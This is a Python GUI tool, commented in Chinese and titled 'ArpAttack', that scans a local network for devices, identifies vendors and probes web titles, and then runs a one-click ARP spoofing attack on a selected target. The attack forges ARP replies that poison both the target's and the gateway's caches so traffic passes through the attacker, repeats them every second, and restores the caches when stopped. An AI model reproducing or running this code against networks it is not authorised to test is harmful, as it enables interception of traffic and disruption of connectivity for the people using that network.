import tkinter as tk
from tkinter import ttk, messagebox, simpledialog
import threading
import asyncio
import time
import sys
import os
import subprocess
import shutil
import re
import json
import urllib.request
from scapy.all import Ether, ARP, sendp, get_if_hwaddr, srp, conf, get_if_list, get_working_if

# ============ 跨平台配置 ============
IS_WINDOWS = sys.platform.startswith('win')

def find_nmap():
    if not IS_WINDOWS:
        return shutil.which("nmap")
    paths = [
        shutil.which("nmap"),
        r"C:\Program Files (x86)\Nmap\nmap.exe",
        r"C:\Program Files\Nmap\nmap.exe",
    ]
    for p in paths:
        if p and os.path.exists(p):
            return p
    return None

NMAP_PATH = find_nmap()

def normalize_mac(mac):
    parts = mac.lower().replace("-", ":").split(":")
    return ":".join(p.zfill(2) for p in parts)

# ============ 自定义备注持久化 ============
NOTES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "device_notes.json")

def load_notes():
    if os.path.exists(NOTES_FILE):
        try:
            with open(NOTES_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_notes(notes):
    try:
        with open(NOTES_FILE, "w", encoding="utf-8") as f:
            json.dump(notes, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"[!] 保存备注失败: {e}")

# ============ 厂商与设备识别字典 ============

# 内置覆盖国内主流硬件、智能电视/模组、光猫及近几年申请的新 OUI
ENHANCED_OUI_DB = {
    # 创维电视及核心供应链 (高盛达 GSD)
    "0C0FD8": "GSD高盛达 (创维/酷开电视无线模组)",
    "907ABE": "GSD高盛达 (智能电视/通讯模组)",
    "089B27": "GSD高盛达 (智能模组)",
    "209771": "GSD高盛达 (无线通讯模组)",
    "001A9A": "Skyworth 创维",
    "10B713": "Skyworth 创维数码",
    "702E22": "Skyworth 创维",
    "E0B9E5": "Skyworth 创维",
    # 必联电子 (B-Link，常用于暴风电视、海信电视等 Wi-Fi 模组/无线网卡)
    "08EA40": "必联电子 (电视/网络无线模组)",
    "C46E1F": "必联电子 (B-Link)",
    "F42853": "必联电子 (B-Link)",
    # 华为 / 荣耀 (含电信/移动定制光猫、路由器)
    "D49400": "Huawei 华为 (电信光猫/主路由)",
    "D48866": "Huawei 华为 (路由器/终端设备)",
    "485702": "Huawei 华为",
    "00E0FC": "Huawei 华为",
    "706979": "Huawei 华为",
    "446E2E": "Huawei 华为",
    "00464B": "Huawei 华为",
    "582A17": "Huawei 华为",
    "E468A3": "Huawei 华为",
    "88E3AB": "Huawei 华为",
    # 小米生态
    "CCDA20": "Xiaomi 小米 (手机/智能生态)",
    "046761": "Xiaomi 小米 (路由器/移动终端)",
    "64A200": "Xiaomi 小米",
    "286C07": "Xiaomi 小米",
    "742344": "Xiaomi 小米",
    "508AB0": "Xiaomi 小米",
    "ACF7F3": "Xiaomi 小米",
    "34CE00": "Xiaomi 小米",
    "14ABF0": "Xiaomi 小米",
    # 苹果设备
    "A07817": "Apple (苹果设备)",
    "CA9CB2": "Apple (苹果设备)",
    "F01898": "Apple (苹果设备)",
    "F4F15A": "Apple (苹果设备)",
    "ACBC32": "Apple (苹果设备)",
    "BC9FEF": "Apple (苹果设备)",
    "DCF505": "Apple (苹果设备)",
    "3C22FB": "Apple (苹果设备)",
    # 物联网 / 芯片模组
    "84F3EB": "Espressif 乐鑫 (ESP32/ESP8266 IoT)",
    "246F28": "Espressif 乐鑫 (ESP32/ESP8266 IoT)",
    "A4CF12": "Espressif 乐鑫 (ESP32/ESP8266 IoT)",
    "10521C": "Tuya 涂鸦智能 (IoT物联网)",
    "68572D": "Tuya 涂鸦智能 (IoT物联网)",
    # 网络设备
    "D46E0E": "TP-Link 普联",
    "50D4F7": "TP-Link 普联",
    "B09575": "TP-Link 普联",
    "E848B8": "TP-Link 普联",
    "3C46D8": "TP-Link 普联",
    "DCFE18": "TP-Link 普联",
    "C83A35": "Tenda 腾达",
    "0495E6": "Tenda 腾达",
    "502B73": "Tenda 腾达",
    # 电视/流媒体终端
    "C8A843": "Hisense 海信电视",
    "8C0DE3": "TCL 智能电视",
    "4437E6": "TCL 智能电视",
}

def load_nmap_mac_db():
    """读取本地 Nmap 厂商字典（若存在）"""
    db = {}
    candidates = [
        "/usr/local/share/nmap/nmap-mac-prefixes",
        "/usr/share/nmap/nmap-mac-prefixes",
        "/opt/homebrew/share/nmap/nmap-mac-prefixes",
    ]
    for path in candidates:
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="latin1") as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith("#"): continue
                        parts = line.split(" ", 1)
                        if len(parts) == 2:
                            db[parts[0].upper()] = parts[1].strip()
                print(f"[*] 已加载 Nmap MAC 字典 ({len(db)} 条): {path}")
                break
            except Exception:
                pass
    return db

NMAP_OUI_CACHE = load_nmap_mac_db()

def is_random_mac(mac):
    """
    判断是否为本地管理地址（私有 / 随机 MAC）
    MAC 地址首字节的第 2 位（二进制 U/L 位）为 1，即十六进制第 2 位为 2, 6, A, E
    """
    try:
        first_byte = int(mac.split(":")[0], 16)
        return bool(first_byte & 0x02)
    except Exception:
        return False

def probe_http_title(ip):
    """探测设备 HTTP/Web 服务的网页标题（如中国电信智能网关、小米路由器）"""
    for port in [80, 8080]:
        try:
            url = f"http://{ip}:{port}/"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"})
            with urllib.request.urlopen(req, timeout=0.6) as resp:
                content = resp.read(2048).decode("utf-8", errors="ignore")
                m = re.search(r"<title>(.*?)</title>", content, re.IGNORECASE | re.DOTALL)
                if m:
                    title = m.group(1).strip()
                    if title:
                        return title
        except Exception:
            pass
    return None

def get_system_arp_cache(iface=None):
    """直接读取操作系统的 ARP 缓存表（可在无 root/sudo 权限下使用）"""
    arp_map = {}
    try:
        if IS_WINDOWS:
            out = subprocess.check_output(["arp", "-a"], text=True, errors="ignore")
            for line in out.splitlines():
                m = re.search(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F-]+)", line)
                if m:
                    ip, mac = m.group(1), normalize_mac(m.group(2))
                    if mac not in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
                        arp_map[ip] = mac
        else:
            cmd = ["arp", "-a"]
            if iface:
                cmd.extend(["-i", iface])
            out = subprocess.check_output(cmd, text=True, errors="ignore")
            for line in out.splitlines():
                m = re.search(r"\(([\d\.]+)\) at ([0-9a-fA-F:]+)", line)
                if m and "(incomplete)" not in line:
                    ip, mac = m.group(1), normalize_mac(m.group(2))
                    if mac not in ("ff:ff:ff:ff:ff:ff", "1:0:5e:0:0:fb"):
                        arp_map[ip] = mac
    except Exception as e:
        print(f"[!] 读取系统 ARP 缓存失败: {e}")
    return arp_map

def get_gateway_for_iface(iface):
    """根据指定网卡查找对应网关"""
    try:
        if not IS_WINDOWS:
            out = subprocess.check_output(["netstat", "-rn", "-f", "inet"], text=True, errors="ignore")
            for line in out.splitlines():
                parts = line.split()
                if len(parts) >= 6 and parts[0] == "default" and parts[5] == iface:
                    return parts[1]
    except Exception:
        pass
    return "192.168.1.1"

# ============ 异步扫描与识别逻辑 ============

class AsyncManager:
    """管理后台 asyncio 事件循环"""
    def __init__(self):
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.thread.start()

    def _run_loop(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()

    def run_coro(self, coro):
        return asyncio.run_coroutine_threadsafe(coro, self.loop)

async_manager = AsyncManager()

async def scan_devices_nmap_async(iface, scan_cidr):
    """使用 asyncio 子进程调用 nmap，并在非 root 环境下联动系统 ARP 缓存补齐 MAC"""
    if not NMAP_PATH:
        return None
    
    try:
        cmd = [NMAP_PATH, "-sn", scan_cidr]
        if not IS_WINDOWS and iface and not iface.startswith("utun"):
            cmd.extend(["-e", iface])

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await proc.communicate()
        output = stdout.decode(errors="ignore")
        
        sections = output.split("Nmap scan report for ")
        found_ips = []
        ip_mac_dict = {}

        for section in sections[1:]:
            lines = section.strip().split("\n")
            ip_match = re.search(r"(\d+\.\d+\.\d+\.\d+)", lines[0])
            if not ip_match: continue
            ip = ip_match.group(1)
            found_ips.append(ip)
            
            mac = None
            vendor = None
            for line in lines:
                if "MAC Address:" in line:
                    mac_match = re.search(r"(([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}))", line)
                    if mac_match:
                        mac = normalize_mac(mac_match.group(1))
                        v_match = re.search(r"\((.*)\)", line)
                        if v_match:
                            vendor = v_match.group(1)
                        break
            if mac:
                ip_mac_dict[ip] = (mac, vendor)

        # 若在非 root 环境下，Nmap 无法输出 MAC 地址，则通过系统 ARP 缓存进行补全
        system_arp = get_system_arp_cache(iface)
        found_devices = []

        for ip in found_ips:
            if ip in ip_mac_dict:
                mac, vendor = ip_mac_dict[ip]
            elif ip in system_arp:
                mac = system_arp[ip]
                vendor = None
            else:
                continue
            found_devices.append({"ip": ip, "mac": mac, "raw_vendor": vendor})

        # 补充系统 ARP 表中存在的其他活跃局域网设备
        seen_ips = {d["ip"] for d in found_devices}
        for ip, mac in system_arp.items():
            if ip not in seen_ips and ip.startswith(scan_cidr.rsplit(".", 1)[0] + "."):
                found_devices.append({"ip": ip, "mac": mac, "raw_vendor": None})

        return found_devices
    except Exception as e:
        print(f"Nmap async scan error: {e}")
        return None

async def scan_devices_scapy_async(iface, scan_cidr):
    """在 executor 中运行 scapy ARP 扫描"""
    loop = asyncio.get_running_loop()
    
    def scapy_scan():
        print(f"[*] 使用 Scapy 扫描: {scan_cidr}")
        base_net = scan_cidr.split('/')[0].rsplit('.', 1)[0]
        found = []
        for i in range(0, 256, 32):
            chunk_ips = [f"{base_net}.{j}" for j in range(i, min(i + 32, 256))]
            try:
                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=chunk_ips), timeout=2, retry=1, inter=0.02, verbose=False, iface=iface)
                for _, received in ans:
                    found.append({"ip": received.psrc, "mac": normalize_mac(received.hwsrc), "raw_vendor": None})
            except Exception:
                pass
        return found

    return await loop.run_in_executor(None, scapy_scan)

async def scan_devices_arp_cache_async(iface):
    """直接从系统 ARP 缓存获取设备"""
    loop = asyncio.get_running_loop()
    def get_arp():
        arp_map = get_system_arp_cache(iface)
        return [{"ip": ip, "mac": mac, "raw_vendor": None} for ip, mac in arp_map.items()]
    return await loop.run_in_executor(None, get_arp)

async def enrich_devices_async(devices):
    """并发丰富设备识别信息（OUI 字典匹配、随机 MAC 标识、Web Title 探测）"""
    loop = asyncio.get_running_loop()

    def identify_single(d):
        ip = d["ip"]
        mac = d["mac"]
        clean_prefix = mac.replace(":", "").replace("-", "").upper()[:6]

        # 1. 检查是否为随机 MAC 地址
        if is_random_mac(mac):
            vendor_text = "移动终端 (私有/随机MAC)"
        # 2. 检查本地增强 OUI 字典
        elif clean_prefix in ENHANCED_OUI_DB:
            vendor_text = ENHANCED_OUI_DB[clean_prefix]
        # 3. 检查 Nmap 本地库
        elif clean_prefix in NMAP_OUI_CACHE:
            vendor_text = NMAP_OUI_CACHE[clean_prefix]
        elif d.get("raw_vendor") and d["raw_vendor"] != "Unknown":
            vendor_text = d["raw_vendor"]
        else:
            vendor_text = "未知设备"

        # 4. 主动特征探测：Web 标题
        title = probe_http_title(ip)
        if title:
            vendor_text = f"{vendor_text} [{title}]"

        return {
            "ip": ip,
            "mac": mac,
            "vendor": vendor_text
        }

    tasks = [loop.run_in_executor(None, identify_single, d) for d in devices]
    enriched = await asyncio.gather(*tasks)

    # 排序：按 IP 升序排列
    def ip_key(item):
        try:
            return [int(x) for x in item["ip"].split(".")]
        except Exception:
            return [999]

    enriched.sort(key=ip_key)
    return enriched

# ============ GUI 类 ============

class ArpAttackGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("ArpAttack - 局域网安全与分析测试")
        self.root.geometry("880x620")
        
        self.notes = load_notes()
        self.attack_task = None
        self.setup_ui()
        
        # 异步初始化：获取网卡和网关，不阻塞主线程
        self.root.after(100, self.async_init)
        
    def async_init(self):
        self.status_var.set("正在初始化网络配置...")
        async_manager.run_coro(self.refresh_interfaces_async())
        
    def setup_ui(self):
        ctrl_frame = ttk.Frame(self.root, padding="10")
        ctrl_frame.pack(fill=tk.X)
        
        ttk.Label(ctrl_frame, text="网卡:").grid(row=0, column=0, padx=5)
        self.iface_var = tk.StringVar(value="正在加载...")
        self.iface_menu = tk.OptionMenu(ctrl_frame, self.iface_var, "正在加载...", command=self.on_iface_change)
        self.iface_menu.grid(row=0, column=1, padx=5)
        
        ttk.Label(ctrl_frame, text="网关:").grid(row=0, column=2, padx=5)
        self.gateway_var = tk.StringVar(value="192.168.1.1")
        ttk.Entry(ctrl_frame, textvariable=self.gateway_var, width=15).grid(row=0, column=3, padx=5)
        
        self.scan_btn = ttk.Button(ctrl_frame, text="🔍 扫描设备", command=self.on_scan_click)
        self.scan_btn.grid(row=0, column=4, padx=10)
        
        list_frame = ttk.LabelFrame(self.root, text="局域网设备列表 (双击某一行可修改自定义备注)", padding="10")
        list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # 列表增加“自定义备注”列
        self.tree = ttk.Treeview(list_frame, columns=("ip", "mac", "vendor", "note"), show="headings")
        self.tree.heading("ip", text="IP 地址")
        self.tree.heading("mac", text="MAC 地址")
        self.tree.heading("vendor", text="设备识别 / 厂商")
        self.tree.heading("note", text="自定义备注 (双击修改)")

        self.tree.column("ip", width=120, anchor="center")
        self.tree.column("mac", width=145, anchor="center")
        self.tree.column("vendor", width=280, anchor="w")
        self.tree.column("note", width=180, anchor="w")

        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        scrollbar = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.tree.yview)
        self.tree.configure(yscroll=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # 双击修改备注
        self.tree.bind("<Double-1>", self.on_item_double_click)

        # 右键上下文菜单
        self.context_menu = tk.Menu(self.root, tearoff=0)
        self.context_menu.add_command(label="✏️ 修改备注", command=self.on_edit_note_click)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="🎯 设为目标并开始攻击", command=self.on_attack_click)

        def show_context_menu(event):
            item = self.tree.identify_row(event.y)
            if item:
                self.tree.selection_set(item)
                self.on_tree_select()
                self.context_menu.post(event.x_root, event.y_root)

        self.tree.bind("<Button-2>" if sys.platform == "darwin" else "<Button-3>", show_context_menu)
        self.tree.bind("<<TreeviewSelect>>", lambda e: self.on_tree_select())

        bottom_frame = ttk.Frame(self.root, padding="10")
        bottom_frame.pack(fill=tk.X)
        
        self.status_var = tk.StringVar(value="准备就绪")
        ttk.Label(bottom_frame, textvariable=self.status_var, foreground="blue").pack(side=tk.LEFT)
        
        # 增加进度条
        self.progress = ttk.Progressbar(bottom_frame, orient=tk.HORIZONTAL, length=150, mode='indeterminate')
        self.progress.pack(side=tk.LEFT, padx=20)
        self.progress.pack_forget()

        # 攻击按钮
        self.attack_btn = ttk.Button(bottom_frame, text="开始 ARP 攻击", command=self.on_attack_click, state=tk.DISABLED)
        self.attack_btn.pack(side=tk.RIGHT, padx=5)

        # 修改备注按钮
        self.note_btn = ttk.Button(bottom_frame, text="✏️ 修改备注", command=self.on_edit_note_click, state=tk.DISABLED)
        self.note_btn.pack(side=tk.RIGHT, padx=5)

    def on_tree_select(self):
        has_sel = bool(self.tree.selection())
        self.attack_btn.config(state=tk.NORMAL if has_sel else tk.DISABLED)
        self.note_btn.config(state=tk.NORMAL if has_sel else tk.DISABLED)

    def on_item_double_click(self, event):
        item_id = self.tree.identify_row(event.y)
        if not item_id: return
        self.tree.selection_set(item_id)
        self.on_edit_note_click()

    def on_edit_note_click(self):
        sel = self.tree.selection()
        if not sel: return
        vals = self.tree.item(sel[0])["values"]
        if not vals: return
        ip, mac = str(vals[0]), str(vals[1])
        current_note = self.notes.get(mac, "")

        new_note = simpledialog.askstring("修改设备备注", f"请输入设备 [{ip} ({mac})] 的备注:", initialvalue=current_note, parent=self.root)
        if new_note is not None:
            new_note = new_note.strip()
            self.notes[mac] = new_note
            save_notes(self.notes)
            # 实时刷新 Treeview 该行
            self.tree.item(sel[0], values=(vals[0], vals[1], vals[2], new_note))
            self.status_var.set(f"已更新设备 [{ip}] 备注: {new_note if new_note else '(空)'}")

    def on_iface_change(self, selected_iface):
        """当用户手动切换网卡时触发"""
        def update_gw():
            try:
                gw = get_gateway_for_iface(selected_iface)
                if not gw or gw == "192.168.1.1":
                    for r in conf.route.routes:
                        if r[3] == selected_iface and r[0] == 0:
                            gw = r[2]
                            break
                if gw:
                    self.root.after(0, lambda: self.gateway_var.set(gw))
                    print(f"[*] 切换网卡 {selected_iface}，自动更新网关为: {gw}")
            except Exception:
                pass
        threading.Thread(target=update_gw, daemon=True).start()

    async def refresh_interfaces_async(self):
        """异步获取网卡和网关信息，优先选择带有局域网 IP 的物理网卡"""
        loop = asyncio.get_running_loop()
        try:
            def get_data():
                raw_ifaces = [str(i) for i in get_if_list()]
                # 排除明显无效或辅助接口
                ifaces = [i for i in raw_ifaces if not i.startswith(('llw', 'gif', 'stf', 'lo'))]
                # 优先将 en 物理网卡排在最前
                ifaces = sorted(ifaces, key=lambda x: (not x.startswith('en'), x))
                
                # 优选默认物理网卡（避免 VPN/代理的 utun 接口被选为默认）
                default_if = "en0"
                gw = "192.168.1.1"

                try:
                    res = conf.route.route("0.0.0.0")
                    candidate_gw, candidate_if = res[1], res[0]
                    if not candidate_if.startswith("utun"):
                        default_if, gw = candidate_if, candidate_gw
                    else:
                        # 查找 en0 或其他物理网卡的网关
                        gw = get_gateway_for_iface("en0")
                except Exception:
                    pass

                return ifaces, gw, default_if

            ifaces, gw, default_if = await loop.run_in_executor(None, get_data)
            
            def update_ui():
                menu = self.iface_menu["menu"]
                menu.delete(0, "end")
                for i in ifaces:
                    menu.add_command(label=i, command=tk._setit(self.iface_var, i, self.on_iface_change))
                
                self.iface_var.set(str(default_if))
                self.gateway_var.set(gw)
                self.status_var.set("网络配置已就绪")
                print(f"[*] 已刷新网卡列表: {len(ifaces)} 个，当前选中: {default_if}")

            self.root.after(0, update_ui)
        except Exception as e:
            print(f"[!] 异步初始化失败: {e}")
            self.root.after(0, lambda: self.status_var.set("初始化失败，请手动检查"))

    def on_scan_click(self):
        self.scan_btn.config(state=tk.DISABLED)
        self.status_var.set("正在深度扫描局域网设备...")
        self.progress.pack(side=tk.LEFT, padx=20)
        self.progress.start(10)
        self.tree.delete(*self.tree.get_children())
        
        gw = self.gateway_var.get()
        cidr = ".".join(gw.split(".")[:-1]) + ".0/24"
        iface = self.iface_var.get()
        
        async def do_scan():
            # 1. 尝试 Nmap (结合系统底层 ARP 缓存)
            devices = await scan_devices_nmap_async(iface, cidr)
            # 2. 如果 Nmap 未返回设备或不可用，尝试 Scapy
            if not devices:
                devices = await scan_devices_scapy_async(iface, cidr)
            # 3. 如果依然未找到设备，直接读取系统 ARP 表作为备用
            if not devices:
                devices = await scan_devices_arp_cache_async(iface)

            # 4. 对发现的设备进行并发特征识别与丰富
            if devices:
                devices = await enrich_devices_async(devices)
            else:
                devices = []
            
            # 回到主线程更新 UI
            self.root.after(0, lambda: self.update_ui_with_devices(devices))
            
        async_manager.run_coro(do_scan())

    def update_ui_with_devices(self, devices):
        for d in devices:
            mac = d["mac"]
            note = self.notes.get(mac, "")
            self.tree.insert("", tk.END, values=(d["ip"], mac, d["vendor"], note))
        self.status_var.set(f"扫描完成 (发现 {len(devices)} 台设备)")
        self.progress.stop()
        self.progress.pack_forget()
        self.scan_btn.config(state=tk.NORMAL)

    def on_attack_click(self):
        if not self.attack_task:
            self.start_attack()
        else:
            self.stop_attack()

    def start_attack(self):
        sel = self.tree.selection()
        if not IS_WINDOWS and os.getuid() != 0:
            if not messagebox.askyesno("权限提示", "检测到当前未以 root/sudo 权限运行。\n在 macOS/Linux 下，发送底层 ARP 数据包需要管理员权限。\n\n是否仍尝试继续？（若报错请在终端使用 sudo python3 gui_arp.py 启动）"):
                return

        vals = self.tree.item(sel[0])["values"]
        ip, mac = str(vals[0]), str(vals[1])
        gw = self.gateway_var.get().strip()
        iface = self.iface_var.get().strip()
        
        async def run_attack():
            try:
                print(f"[*] 准备对 {ip} 进行攻击...")
                print(f"[*] 使用网卡: {iface}, 网关: {gw}")
                self.root.after(0, lambda: self.status_var.set("正在获取网关 MAC..."))
                loop = asyncio.get_running_loop()
                def get_gw_mac():
                    # 1. 优先从已扫描出的设备列表中直接提取
                    for item in self.tree.get_children():
                        row = self.tree.item(item)["values"]
                        if row and str(row[0]).strip() == gw:
                            return normalize_mac(str(row[1]).strip())

                    # 2. 从系统 ARP 缓存中直接获取
                    sys_arp = get_system_arp_cache(iface)
                    if gw in sys_arp:
                        return sys_arp[gw]

                    # 3. 发送一次轻量 ping 激活系统 ARP 缓存后再查
                    try:
                        ping_cmd = ["ping", "-n", "1", "-w", "1000", gw] if IS_WINDOWS else ["ping", "-c", "1", "-W", "1", gw]
                        subprocess.run(ping_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        sys_arp = get_system_arp_cache(iface)
                        if gw in sys_arp:
                            return sys_arp[gw]
                    except Exception:
                        pass

                    # 4. 尝试 Scapy 发送 ARP 查询
                    try:
                        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw), timeout=3, retry=2, verbose=False, iface=iface)
                        if ans:
                            return normalize_mac(ans[0][1].hwsrc)
                    except Exception:
                        pass

                    return None
                
                gw_mac = await loop.run_in_executor(None, get_gw_mac)
                if not gw_mac: raise Exception(f"无法发现网关 {gw} 的 MAC，请检查网关 IP 与网卡配置是否正确")
                
                self_mac = get_if_hwaddr(iface)
                p1 = Ether(dst=mac, src=self_mac)/ARP(op=2, psrc=gw, hwsrc=self_mac, pdst=ip, hwdst=mac)
                p2 = Ether(dst=gw_mac, src=self_mac)/ARP(op=2, psrc=ip, hwsrc=self_mac, pdst=gw, hwdst=gw_mac)
                
                self.root.after(0, lambda: self.status_var.set(f"攻击进行中: {ip}"))
                self.root.after(0, lambda: self.attack_btn.config(text="停止攻击"))
                
                while True:
                    await loop.run_in_executor(None, lambda: sendp([p1, p2], iface=iface, verbose=False))
                    await asyncio.sleep(1)
            except asyncio.CancelledError:
                # 恢复
                r1 = Ether(dst=mac)/ARP(op=2, psrc=gw, hwsrc=gw_mac, pdst=ip, hwdst=mac)
                r2 = Ether(dst=gw_mac)/ARP(op=2, psrc=ip, hwsrc=mac, pdst=gw, hwdst=gw_mac)
                await loop.run_in_executor(None, lambda: sendp([r1, r2], iface=iface, count=3, verbose=False))
                self.root.after(0, lambda: self.status_var.set("攻击已停止且 ARP 已恢复"))
            except Exception as e:
                self.root.after(0, lambda: messagebox.showerror("错误", str(e)))
                self.root.after(0, lambda: self.stop_attack())

        self.attack_task = async_manager.run_coro(run_attack())

    def stop_attack(self):
        if self.attack_task:
            self.attack_task.cancel()
            self.attack_task = None
        self.attack_btn.config(text="开始 ARP 攻击")

if __name__ == "__main__":
    if not (os.getuid() == 0 if not IS_WINDOWS else True):
        print("提示: 建议在需要发起 ARP 攻击时使用 sudo 运行以获得完整原始套接字权限")
    
    root = tk.Tk()
    app = ArpAttackGUI(root)
    root.mainloop()
